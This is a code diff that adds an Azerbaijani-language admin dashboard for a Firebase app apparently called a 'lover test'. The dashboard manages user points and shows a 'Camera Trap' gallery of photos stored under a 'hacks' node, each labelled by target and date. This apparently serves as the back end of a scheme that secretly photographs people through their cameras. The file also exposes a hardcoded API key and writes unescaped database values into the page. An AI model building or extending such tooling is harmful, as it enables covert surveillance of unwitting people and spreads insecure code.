@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WW24 | ROOT ADMIN PANEL</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <style>
+        :root { --accent: #00f2ff; --red: #ff3e3e; --bg: #05070a; --card: #0e121a; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; }
+        
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--accent); padding-bottom: 15px; margin-bottom: 30px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        
+        .card { background: var(--card); border-radius: 15px; padding: 20px; border: 1px solid #1a202c; height: 500px; overflow-y: auto; }
+        h2 { font-size: 1rem; color: var(--accent); text-transform: uppercase; margin-top: 0; border-bottom: 1px solid #1a202c; padding-bottom: 10px; }
+        
+        /* İstifadəçi Listi */
+        .user-item { display: flex; justify-content: space-between; align-items: center; background: #161b26; padding: 12px; border-radius: 10px; margin-bottom: 10px; font-size: 0.9rem; }
+        .user-info b { color: var(--accent); }
+        .controls input { width: 60px; background: #000; border: 1px solid #333; color: var(--accent); padding: 5px; border-radius: 5px; }
+        .controls button { background: var(--accent); border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+
+        /* Camera Trap Gallery */
+        .trap-item { background: #161b26; border-radius: 10px; padding: 10px; margin-bottom: 15px; text-align: center; border: 1px solid #2d3748; }
+        .trap-item img { width: 100%; border-radius: 8px; margin-top: 10px; border: 1px solid var(--red); }
+        .trap-item small { display: block; margin-bottom: 5px; color: #888; font-size: 0.7rem; }
+
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-thumb { background: var(--accent); border-radius: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div>
+            <h1 style="margin:0; font-size: 1.4rem;">WW24 <span style="color:var(--accent)">ROOT</span></h1>
+            <small style="color:#555">Sistem Admin Paneli v4.0</small>
+        </div>
+        <button onclick="location.reload()" style="background:none; border:1px solid #333; color:white; padding:8px 15px; border-radius:8px; cursor:pointer;">
+            <i class="fas fa-sync"></i> Yenilə
+        </button>
+    </div>
+
+    <div class="grid">
+        <div class="card">
+            <h2><i class="fas fa-users"></i> İstifadəçi Bazası</h2>
+            <div id="user-list">Yüklənir...</div>
+        </div>
+
+        <div class="card">
+            <h2><i class="fas fa-camera"></i> Son Çəkilişlər (Trap)</h2>
+            <div id="trap-list">Şəkillər gözlənilir...</div>
+        </div>
+    </div>
+
+    <script>
+        // Sənin Firebase Konfiqurasiyan
+        const firebaseConfig = { 
+            apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU", 
+            databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com", 
+            projectId: "sevgili-testi" 
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // İSTİFADƏÇİLƏRİ GƏTİR
+        db.ref('users').on('value', snap => {
+            const list = document.getElementById('user-list');
+            list.innerHTML = "";
+            snap.forEach(user => {
+                const data = user.val();
+                const uName = user.key;
+                
+                const div = document.createElement('div');
+                div.className = 'user-item';
+                div.innerHTML = `
+                    <div class="user-info">
+                        <b>${uName}</b> <br> 
+                        <small>Xal: ${data.points || 0}</small>
+                    </div>
+                    <div class="controls">
+                        <input type="number" id="pts-${uName}" placeholder="+/-">
+                        <button onclick="updatePoints('${uName}')">Ver</button>
+                    </div>
+                `;
+                list.appendChild(div);
+            });
+        });
+
+        // XAL GÖNDƏR
+        function updatePoints(user) {
+            const val = parseInt(document.getElementById(`pts-${user}`).value);
+            if(!val) return;
+            db.ref('users/' + user + '/points').transaction(p => (p || 0) + val);
+            alert(user + " üçün xal yeniləndi!");
+        }
+
+        // CAMERA TRAP ŞƏKİLLƏRİNİ GƏTİR
+        db.ref('hacks').on('value', snap => {
+            const list = document.getElementById('trap-list');
+            list.innerHTML = "";
+            snap.forEach(userHacks => {
+                const targetName = userHacks.key; // Hansı adminə gəlib
+                userHacks.forEach(hack => {
+                    const data = hack.val();
+                    const div = document.createElement('div');
+                    div.className = 'trap-item';
+                    div.innerHTML = `
+                        <small>Admin: <b>${targetName}</b> | Tarix: ${data.date || 'Naməlum'}</small>
+                        <img src="${data.image}">
+                    `;
+                    list.appendChild(div);
+                });
+            });
+        });
+    </script>
+</body>
+</html>
